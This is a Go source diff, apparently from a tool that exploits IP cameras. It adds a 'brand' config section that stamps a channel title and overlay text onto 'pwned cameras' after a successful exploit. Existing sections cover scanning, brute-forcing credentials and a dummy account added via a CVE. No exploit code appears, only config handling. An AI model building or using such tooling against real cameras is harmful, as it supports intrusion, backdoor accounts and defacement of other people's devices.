@@ -37,11 +37,18 @@ type DummyConfig struct {
 	Password string `toml:"password"`
 }
 
+type BrandConfig struct {
+	Enabled      bool     `toml:"enabled"`
+	ChannelTitle string   `toml:"channel_title"`
+	OverlayText  []string `toml:"overlay_text"`
+}
+
 type Config struct {
 	Scan  ScanConfig  `toml:"scan"`
 	Pwn   PwnConfig   `toml:"pwn"`
 	Brute BruteConfig `toml:"brute"`
 	Dummy DummyConfig `toml:"dummy"`
+	Brand BrandConfig `toml:"brand"`
 	Path  string
 }
 
@@ -72,6 +79,11 @@ credentials = [
 [dummy] # Credentials for "dummy" account added via CVE
 login = "p2pwn" # 5-32 alphanumeric characters
 password = "p2password" # 8-32 alphanumeric characters
+
+[brand] # Branding settings applied after successful exploit
+enabled = false # Apply channel title and overlay text to pwned cameras
+channel_title = "" # Channel title template ({serial}, {model} placeholders)
+overlay_text = ["", "", "", "", ""] # Overlay text lines (up to 5, supports {serial}, {model})
 `
 
 type Range struct {
@@ -204,6 +216,13 @@ func LoadConfig(path string, isDefault bool) (*Config, error) {
 	
 	if len(conf.Dummy.Password) < 8 || len(conf.Dummy.Password) > 32 || !alphanum.MatchString(conf.Dummy.Password) {
 		return nil, fmt.Errorf("invalid dummy password format in config")
+	}
+
+	
+	if conf.Brand.Enabled {
+		if len(conf.Brand.OverlayText) > 5 {
+			conf.Brand.OverlayText = conf.Brand.OverlayText[:5]
+		}
 	}
 
 	conf.Path = path
